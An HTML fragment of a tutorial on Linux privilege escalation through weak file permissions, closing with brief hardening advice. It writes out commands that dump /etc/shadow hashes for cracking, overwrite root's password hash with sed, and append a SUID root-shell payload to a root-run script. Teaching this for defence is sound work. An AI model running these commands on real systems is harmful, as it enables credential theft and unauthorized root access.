            <h1 class="mt-4">Exploiting Weak File Permissions</h1>

            <p>
                Weak file permissions in Linux can allow a low-privileged user to read or modify files they shouldn't
                have access to. This can lead to privilege escalation, credential dumping, or even full root access.
            </p>

            <p>
                Check sensitive files like <code>/etc/shadow</code> for weak permissions:
            </p>
            <pre><code>$ ls -l /etc/shadow</code></pre>

            <p><strong>Vulnerable output:</strong></p>
            <pre><code>-rw-r--r-- 1 root root 1484 Apr 12 10:00 /etc/shadow</code></pre>

            <p>
                If <code>/etc/shadow</code> is readable by others, it means someone could extract password hashes and
                potentially crack them offline.
            </p>

            <h4 class="mt-4">Dumping Hashes</h4>
            <p>To dump the password hashes, run:</p>
            <pre><code>$ cat /etc/shadow
root:$6$3kERjdM$7k...:19327:0:99999:7:::
user1:$6$yzb...:19327:0:99999:7:::</code></pre>

            <p>
                Now you can crack the hashes using tools like <code>john</code> or <code>hashcat</code> to obtain the
                actual
                passwords.
            </p>

            <h4 class="mt-4">Writable /etc/shadow?</h4>
            <p>If you somehow have write access to <code>/etc/shadow</code>, you can modify the file:</p>
            <pre><code>$ sed -i 's/^root:[^:]*:/root:$6$YOURNEWSHASH$SOMETHING:/' /etc/shadow</code></pre>

            <p>
                This command replaces the root password hash with one of your own choosing, allowing you to log in as
                root.
            </p>

            <h3 class="mt-5">Writable Script File Executed by Root</h3>

            <p>
                Letâ€™s say we find a script file with weak permissions:
            </p>
            <pre><code>-rwxrwxrwx 1 root root 88 Apr 10 10:00 /usr/local/bin/backup.sh</code></pre>

            <p>
                If this script is scheduled to run via cron or is triggered by a root-owned service, and you can modify
                it, you can inject malicious commands into the script.
            </p>

            <h4 class="mt-4">Inject Payload</h4>
            <p>Add a root shell creation payload:</p>
            <pre><code>$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh</code></pre>

            <p>Once the script runs as root, you can execute the payload:</p>
            <pre><code>$ /tmp/rootbash -p
# whoami
root</code></pre>

            <h4 class="mt-4">Why This Works</h4>
            <p>
                If a file that is executed by root is writable by any user, they can inject commands into the file. When
                this file is run as root, those commands execute with root privileges, giving full control to the
                attacker.
            </p>

            <h3 class="mt-5">How to Fix Weak File Permissions</h3>
            <ul>
                <li>Set the correct permissions on sensitive files, for example: <code>chmod 640 /etc/shadow</code>.
                </li>
                <li>Ensure that only root can write to scripts that are executed by root.</li>
                <li>Regularly audit your file permissions using commands like <code>find</code> to identify any files
                    with weak permissions.</li>
            </ul>

            <h3 class="mt-5">Conclusion</h3>
            <p>
                Weak file permissions are often overlooked, but they can be devastating. Always check critical files
                like <code>/etc/shadow</code>, and monitor writable files and scripts that root may run. Exploiting just
                one misconfigured file can lead to full system compromise.
